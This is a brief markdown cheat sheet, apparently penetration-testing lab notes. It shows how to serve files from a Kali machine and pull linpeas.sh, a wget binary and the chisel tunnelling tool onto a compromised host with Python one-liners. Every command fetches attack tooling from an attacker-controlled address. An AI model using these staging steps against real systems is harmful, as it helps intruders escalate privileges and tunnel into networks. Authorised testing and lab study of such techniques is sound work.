`on kali`

```bash
python2.7 -m SimpleHTTPServer 80
```

`on the box`


```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://IP-ADD//linpeas.sh', 'linpeas.sh')"
```
**or**

```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://192.168.1.36:80/linpeas.sh', 'linpeas.sh')"
````

## python3
```bash
python3 -c "import urllib.request; urllib.request.urlretrieve('http://192.168.56.1//wget', 'wget')"
```
## python2.7 
```bash
python2.7 -c "import urllib; urllib.urlretrieve('http://192.168.56.1/chisel-amd64', 'chisel')"
```
